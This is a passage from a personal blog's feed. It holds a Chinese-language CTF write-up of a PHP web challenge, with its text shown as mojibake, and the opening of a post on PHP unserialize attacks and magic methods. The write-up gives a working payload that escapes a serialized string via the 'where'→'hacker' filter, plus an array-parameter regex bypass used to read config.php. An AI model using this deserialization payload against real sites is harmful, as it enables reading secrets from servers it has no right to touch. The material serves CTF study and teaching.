class="variable">$nickname</span> = <span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line"><span class="variable">$photo</span> = base64_encode(file_get_contents(<span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>]));</span><br><span class="line"></span><br><span class="line"><span class="variable">$profile</span>=<span class="variable">$user</span>-&gt;show_profile(<span class="variable">$username</span>); <span class="comment">// $profile æ˜¯è°ƒç”¨$user-&gt;show_profile()å¾—åˆ°çš„</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// class.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show_profile</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123; </span><br><span class="line">    <span class="comment">// profileæ˜¯ä»æ•°æ®åº“è¯»å‡ºæ¥çš„, å¹¶ä¸”æ²¡æœ‰å¤„ç†, æ‰€ä»¥æ•°æ®åº“ä¸­å°±æ˜¯åºåˆ—åŒ–å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="variable">$username</span> = <span class="built_in">parent</span>::filter(<span class="variable">$username</span>); </span><br><span class="line"></span><br><span class="line"><span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$object</span> = <span class="built_in">parent</span>::select(<span class="keyword">$this</span>-&gt;table, <span class="variable">$where</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$object</span>-&gt;profile;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$new_profile</span></span>) </span>&#123; </span><br><span class="line">    <span class="comment">// profileä¸Šä¼ æ—¶ä¼šç»è¿‡ä¸€æ¬¡è¿‡æ»¤</span></span><br><span class="line"><span class="variable">$username</span> = <span class="built_in">parent</span>::filter(<span class="variable">$username</span>);</span><br><span class="line"><span class="variable">$new_profile</span> = <span class="built_in">parent</span>::filter(<span class="variable">$new_profile</span>); <span class="comment">// è¿™ä¸ªè¿‡æ»¤å™¨ä¼šæ›¿æ¢å­—ç¬¦, å¯ä»¥ä½¿å¾—å­—ç¬¦é•¿åº¦å˜é•¿</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">&#x27;profile&#x27;</span>, <span class="variable">$new_profile</span>, <span class="variable">$where</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°è¿™é‡Œå¤§æ¦‚å°±æœ‰æ€è·¯äº†, <code>$profile</code>æ˜¯ä¸Šä¼ è‡³æ•°æ®åº“åé‡æ–°è¯»å–ä¸‹æ¥çš„, è€Œä¸”ä¸Šä¼ ä¹‹å‰ä¼šå¯¹åºåˆ—åŒ–ä¸²è¿›è¡Œä¸€æ¬¡æ›¿æ¢, æ›¿æ¢å­˜åœ¨å­—ç¬¦æ•°é‡å¢åŠ , ä¹Ÿå°±æ„å‘³ç€å¯ä»¥å­—ç¬¦é€ƒé€¸,  å¦‚æœæœ‰å­—ç¬¦é€ƒé€¸, é‚£ä¹ˆå®Œå…¨å¯ä»¥ä¼ªé€ ä¸€ä¸ªå‡çš„<code>$profile[&#39;photo&#39;]=&#39;config.php&#39;</code>, ç„¶åè¯»å–flag</p><p>å†ç»§ç»­å¾€å‰çœ‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// register.php æä¾›äº†æ³¨å†Œçš„å…¥å£, æ³¨å†Œå®Œå°±èƒ½éšä¾¿ç™»å½•äº†, ç™»å½•åå°±èƒ½ä¸Šä¼ profile</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// update.php</span></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>]))</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Invalid phone&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]))</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Invalid email&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) || strlen(<span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Invalid nickname&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;photo&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Photo size error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">move_uploaded_file(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;upload/&#x27;</span> . md5(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . md5(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span>-&gt;update_profile(<span class="variable">$username</span>, serialize(<span class="variable">$profile</span>));</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„æœ‰å¾ˆå¤šå‚æ•°<code>phone,Â email,Â nickname</code>éƒ½å¯ä»¥, ä½†æ˜¯å¦‚æœè¦è¿›è¡Œå­—ç¬¦é€ƒé€¸, å¿…ç„¶ä¼šè¢«å‰é¢çš„æ­£åˆ™å‘ç°å¯¼è‡´ä¸Šä¼ å¤±è´¥, æ‰€ä»¥è¦æƒ³åŠæ³•ç»•è¿‡</p><h2 id="æ•°ç»„ç»•è¿‡"><a href="#æ•°ç»„ç»•è¿‡" class="headerlink" title="æ•°ç»„ç»•è¿‡"></a>æ•°ç»„ç»•è¿‡</h2><p>phpä¸­çš„æ•°ç»„æ˜¯ä¸€ä¸ªå¾ˆç¥å¥‡çš„ä¸œè¥¿, ä»–ä¼šæœ‰ä¸‹é¢è¿™äº›ç‰¹æ€§</p><ol><li><code>md5(Array()) = null</code></li><li><code>sha1(Array()) = null</code></li><li><code>ereg(pattern,Array()) =null</code></li><li><code>preg_match(pattern,Array()) = false</code></li><li><code>strcmp(Array(), â€œabcâ€) =null</code></li><li><code>strpos(Array(),â€œabcâ€) = null </code></li><li><code>strlen(Array()) = null</code> 5.3ä»¥ä¸‹ç‰ˆæœ¬æ— æŠ¥é”™, 5.3åŠä»¥ä¸Šç‰ˆæœ¬ä¼šå‡ºç°E_NOTICEçº§åˆ«é”™è¯¯, ä¸‹é¢æœ‰å…³äºé”™è¯¯ç­‰çº§çš„ä¸€äº›çŸ¥è¯†</li></ol><p> æˆ‘ä»¬å¯ä»¥çœ‹åˆ°, å¦‚æœå‚æ•°æ˜¯æ•°ç»„, é‚£ä¹ˆ<code>preg_match()</code>å’Œ<code>strlen()</code>éƒ½ä¼šè¿”å›NULL,å¹¶ä¸”å‡ºç°E_NOTICEé”™è¯¯, è¿™ä¸ªé”™è¯¯æ˜¯ä¸å½±å“ç¨‹åºç»§ç»­è¿è¡Œçš„. </p><p>æ‰€ä»¥, æˆ‘ä»¬åªè¦ä¼ å‚<code>nickname[]=xxxxxx</code>, å°±å¯ä»¥ç»•è¿‡è¿™ä¸ªæ­£åˆ™, ä»»æ„æ§åˆ¶å‚æ•°<code>$_POST[&#39;nickname&#39;]</code>äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) || strlen(<span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Invalid nickname&#x27;</span>);</span><br></pre></td></tr></table></figure><h3 id="PHP-é”™è¯¯ç­‰çº§"><a href="#PHP-é”™è¯¯ç­‰çº§" class="headerlink" title="PHP é”™è¯¯ç­‰çº§"></a>PHP é”™è¯¯ç­‰çº§</h3><p>E_NOTICE è¡¨ç¤ºä¸€èˆ¬æƒ…å½¢ä¸è®°å½•ï¼Œåªæœ‰ç¨‹å¼æœ‰é”™è¯¯æƒ…å½¢æ—¶æ‰ç”¨åˆ°ï¼Œä¾‹å¦‚ä¼å›¾å­˜å–ä¸€ä¸ªä¸å­˜åœ¨çš„å˜æ•°ï¼Œæˆ–æ˜¯å‘¼å« stat() å‡½å¼æ£€è§†ä¸å­˜åœ¨çš„æ¡£æ¡ˆã€‚<br>E_WARNING é€šå¸¸éƒ½ä¼šæ˜¾ç¤ºå‡ºæ¥ï¼Œä½†ä¸ä¼šä¸­æ–­ç¨‹å¼çš„æ‰§è¡Œã€‚è¿™å¯¹é™¤é”™å¾ˆæœ‰æ•ˆã€‚ä¾‹å¦‚ï¼šç”¨æœ‰é—®é¢˜çš„å¸¸è§„è¡¨ç¤ºæ³•å‘¼å« ereg()ã€‚<br>E_ERROR é€šå¸¸ä¼šæ˜¾ç¤ºå‡ºæ¥ï¼Œäº¦ä¼šä¸­æ–­ç¨‹å¼æ‰§è¡Œã€‚æ„å³ç”¨è¿™ä¸ªé®ç½©æ— æ³•è¿½æŸ¥åˆ°è®°å¿†ä½“é…ç½®æˆ–å…¶å®ƒçš„é”™è¯¯ã€‚<br>E_PARSE ä»è¯­æ³•ä¸­å‰–æé”™è¯¯ã€‚<br>E_CORE_ERROR ç±»ä¼¼ E_ERRORï¼Œä½†ä¸åŒ…æ‹¬ PHPæ ¸å¿ƒé€ æˆçš„é”™è¯¯ã€‚<br>E_CORE_WARNING ç±»ä¼¼ E_WARNINGï¼Œä½†ä¸åŒ…æ‹¬ PHP æ ¸å¿ƒé”™è¯¯è­¦å‘Šã€‚</p><p>æ‰€ä»¥æ•´ä¸ªæµç¨‹å°±æ˜¯</p><p>é€šè¿‡ç»•è¿‡æ­£åˆ™ä»»æ„ä¸Šä¼ <code>nickename</code> -&gt; æ›¿æ¢<code>serialize_string</code>ä¸­çš„å­—ç¬¦æ”¹å˜å­—ç¬¦é•¿åº¦é€ æˆå­—ç¬¦é€ƒé€¸ -&gt; åˆ©ç”¨<code>file_get_contents()</code>è¯»å–<code>config.php</code></p><h1 id="payloadæ„é€ "><a href="#payloadæ„é€ " class="headerlink" title="payloadæ„é€ "></a>payloadæ„é€ </h1><p>é‚£ä¹ˆè¦æ€ä¹ˆæ„é€ <code>nickname[]</code>æ¥è¿›è¡Œå­—ç¬¦é€ƒé€¸å‘¢,</p><p>å…ˆæ¥çœ‹çœ‹è¿™ä¸ªåºåˆ—åŒ–å­—ç¬¦ä¸²å¤§æ¦‚æ˜¯æ€æ ·çš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="string">&#x27;11111111111&#x27;</span>;</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="string">&#x27;11111111@qq.com&#x27;</span>;</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . md5(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$profile</span>);</span><br><span class="line"><span class="comment"># ?nickname[]=</span></span><br><span class="line"><span class="comment"># a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:15:&quot;11111111@qq.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:0:&quot;&quot;;&#125;s:5:&quot;photo&quot;;s:39:&quot;upload/d41d8cd98f00b204e9800998ecf8427e&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>å¦‚æœæˆ‘ä»¬æƒ³æœ€åååºåˆ—åŒ–å‡ºæ¥çš„<code>photo =&gt;Â config.php</code>,<br>é‚£ä¹ˆä¼ ä¸Šå»çš„<code>nickname</code>æœ€åä¸€æ®µåº”è¯¥æ˜¯è¿™ä¸ª<code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>,  è¿™æ®µå­—ç¬¦ä¸€å…±34ä¸ª, å†çœ‹ä¸€ä¸‹æ›¿æ¢çš„å‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line"><span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>; <span class="comment"># è¿‡æ»¤&#x27;select&#x27;, &#x27;insert&#x27;, &#x27;update&#x27;, &#x27;delete&#x27;, &#x27;where&#x27; æ›¿æ¢æˆhacker</span></span><br><span class="line"><span class="keyword">return</span> preg_replace(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°, åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²<code>serialize_string</code>ä¸­å­˜åœ¨<code>where</code>æ—¶ä¼šè¢«æ›¿æ¢æˆ<code>hacker</code>, é‚£ä¹ˆå­—ç¬¦ä¸²é•¿åº¦å°±ä¼š+1<br>æ‰€ä»¥<code>nickname</code>ä¸­éœ€è¦34ä¸ª<code>where</code>å°±èƒ½æŠŠåé¢çš„å­—ç¬¦æŒ¤å‡ºå»å®ç°é€ƒé€¸, å¯ä»¥çœ‹ä¸€ä¸‹å…·ä½“æ•ˆæœ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ?nickname[]=</span></span><br><span class="line"><span class="comment">#wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>] = <span class="string">&#x27;11111111111&#x27;</span>;</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>] = <span class="string">&#x27;11111111@qq.com&#x27;</span>;</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>] = <span class="string">&#x27;upload/&#x27;</span> . md5(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$profile</span>);</span><br><span class="line"><span class="comment"># a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:15:&quot;11111111@qq.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:204:&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&quot;;&#125;s:5:&quot;photo&quot;;s:39:&quot;upload/d41d8cd98f00b204e9800998ecf8427e&quot;;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> filter(serialize(<span class="variable">$profile</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment"># a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:15:&quot;11111111@qq.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:204:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&quot;;&#125;s:5:&quot;photo&quot;;s:39:&quot;upload/d41d8cd98f00b204e9800998ecf8427e&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>ç­‰åˆ°ååºåˆ—åŒ–çš„æ—¶å€™, å°±åªä¼šååºåˆ—åŒ–å‰é¢ä¸€éƒ¨åˆ†äº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:15:&quot;11111111@qq.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:204:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br></pre></td></tr></table></figure><p>ç»“æœå°±ä¼šæ˜¯:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">4</span>) &#123; [<span class="string">&quot;phone&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">11</span>) <span class="string">&quot;11111111111&quot;</span> </span><br><span class="line">[<span class="string">&quot;email&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">15</span>) <span class="string">&quot;11111111@qq.com&quot;</span> </span><br><span class="line">[<span class="string">&quot;nickname&quot;</span>]=&gt; <span class="keyword">array</span>(<span class="number">1</span>) &#123; [<span class="number">0</span>]=&gt; <span class="keyword">string</span>(<span class="number">204</span>) <span class="string">&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;</span> &#125; </span><br><span class="line">[<span class="string">&quot;photo&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">10</span>) <span class="string">&quot;config.php&quot;</span> </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>æˆåŠŸäº†!</p><h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><p>å…ˆéšä¾¿æ³¨å†Œä¸€ä¸ªç”¨æˆ·å¹¶ç™»å½•ï¼Œåœ¨<code>profile</code>ä¸Šä¼ çš„æ—¶å€™å…ˆéšä¾¿å¡«å†™æ•°æ®ï¼Œå†æŠ“åŒ…ï¼Œå°†<code>nickname</code>æ”¹æˆ<br><code>nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code></p><p>ä¸Šä¼ å®Œåè®¿é—®<code>profile.php</code>, æŸ¥çœ‹å›¾ç‰‡çš„åœ°å€ï¼Œæœ€åæŠŠ<code>base64</code>è½¬æˆæ–‡æœ¬å°±æœ‰flagäº†</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;è¿™é¢˜ç®—æ˜¯ç¬¬ä¸€æ¬¡åšæ¯”è¾ƒé•¿çš„webé¢˜, æ”¶è·å¾ˆå¤š, å¥½å¥½è®°å½•ä¸€ä¸‹&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;æ¦‚è¿°&quot;&gt;&lt;a href=&quot;#æ¦‚è¿°&quot; class=&quot;headerlink&quot; title=&quot;æ¦‚è¿°&quot;&gt;&lt;/a&gt;æ¦‚è¿°&lt;/h1&gt;&lt;p&gt;è¿™é“é¢˜ä¸»è¦</summary>
      
    
    
    
    <category term="WebSummary" scheme="http://tearsjin.github.io/categories/WebSummary/"/>
    
    
    <category term="Web" scheme="http://tearsjin.github.io/tags/Web/"/>
    
    <category term="æºç æ³„éœ²" scheme="http://tearsjin.github.io/tags/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/"/>
    
    <category term="unsrialize" scheme="http://tearsjin.github.io/tags/unsrialize/"/>
    
    <category term="å­—ç¬¦é€ƒé€¸" scheme="http://tearsjin.github.io/tags/%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/"/>
    
    <category term="æ­£åˆ™ç»•è¿‡" scheme="http://tearsjin.github.io/tags/%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87/"/>
    
  </entry>
  
  <entry>
    <title>The learning of php unserialize</title>
    <link href="http://tearsjin.github.io/2021/03/23/The-learning-of-php-unserialize/"/>
    <id>http://tearsjin.github.io/2021/03/23/The-learning-of-php-unserialize/</id>
    <published>2021-03-23T06:20:24.000Z</published>
    <updated>2021-03-27T12:10:58.510Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h1><p>å½“<code>unserialize()</code>çš„å‚æ•°å¯æ§æ—¶, å¯ä»¥ä¼ å…¥ä¸€ä¸ªæ„é€ å¥½çš„åºåˆ—ä¸²æ§åˆ¶ç±»å†…éƒ¨çš„å˜é‡ç”šè‡³å‡½æ•°, å¦‚æœç±»å†…éƒ¨å­˜åœ¨æ¯”è¾ƒå±é™©çš„å‡½æ•°<code>include() eval()</code>ç­‰ç­‰, å°†ä¼šé€ æˆä¸¥é‡åæœ</p><h1 id="å¦‚ä½•åˆ©ç”¨"><a href="#å¦‚ä½•åˆ©ç”¨" class="headerlink" title="å¦‚ä½•åˆ©ç”¨"></a>å¦‚ä½•åˆ©ç”¨</h1><p>å½“æœåŠ¡ç«¯ä»£ç ä¸­å­˜åœ¨æŸä¸ªç±»çš„æ—¶å€™, å¯ä»¥é€šè¿‡<code>unserialize()</code>åˆ›å»ºä¸€ä¸ªè¯¥ç±»çš„å¯¹è±¡, è€Œæˆ‘ä»¬å¯æ§çš„å°±æ˜¯ç±»ä¸­çš„å±æ€§, è¿˜å¯ä»¥åˆ©ç”¨ä¸€äº›æŠ€å·§å»ç»•è¿‡ä¸€äº›é­”æœ¯æ–¹æ³•æˆ–è€…æ˜¯åˆ©ç”¨ä¸€äº›é­”æœ¯æ–¹æ³•. é€šè¿‡æ§åˆ¶é­”æœ¯æ–¹æ³•å’Œå±æ€§è¾¾åˆ°æˆ‘ä»¬æƒ³è¦çš„æ”»å‡»æ•ˆæœ.</p><h2 id="ä¸€èˆ¬æµç¨‹"><a href="#ä¸€èˆ¬æµç¨‹" class="headerlink" title="ä¸€èˆ¬æµç¨‹"></a>ä¸€èˆ¬æµç¨‹</h2><ol><li><p> å¯»æ‰¾å‚æ•°å¯æ§çš„<code>unserialize()</code></p></li><li><p>å¯»æ‰¾å¯ä»¥ç”¨äºå‘½ä»¤æ‰§è¡Œ, æ–‡ä»¶åŒ…å«ç­‰ç­‰çš„å‡½æ•°åœ¨å±é™©ç±»</p></li><li><p>æ‰¾åˆ°ä¸€ä¸ªæ§åˆ¶é“¾æ§åˆ¶å±é™©ç±»ä¸­çš„å±é™©å‡½æ•°</p></li></ol><h2 id="é­”æœ¯æ–¹æ³•"><a href="#é­”æœ¯æ–¹æ³•" class="headerlink" title="é­”æœ¯æ–¹æ³•"></a>é­”æœ¯æ–¹æ³•</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__wakeup() &#x2F;&#x2F;æ‰§è¡Œunserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°</span><br><span class="line">__sleep() &#x2F;&#x2F;æ‰§è¡Œserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°</span><br><span class="line">__destruct() &#x2F;&#x2F;å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘</span><br><span class="line">__call() &#x2F;&#x2F;åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</span><br><span class="line">__callStatic() &#x2F;&#x2F;åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</span><br><span class="line">__get() &#x2F;&#x2F;ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®æˆ–è€…ä¸å­˜åœ¨è¿™ä¸ªé”®éƒ½ä¼šè°ƒç”¨æ­¤æ–¹æ³•</span><br><span class="line">__set() &#x2F;&#x2F;ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§</span><br><span class="line">__isset() &#x2F;&#x2F;åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘</span><br><span class="line">__unset() &#x2F;&#x2F;åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘</span><br><span class="line">__toString() &#x2F;&#x2F;æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘</span><br><span class="line">__invoke() &#x2F;&#x2F;å½“å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘</span><br></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„çš„æ˜¯, <code>__toString()</code>è¿™ä¸ªæ–¹æ³•è§¦å‘çš„æ–¹å¼æ¯”è¾ƒå¤š:</p><ol><li><code>echo ($obj) / print($obj) 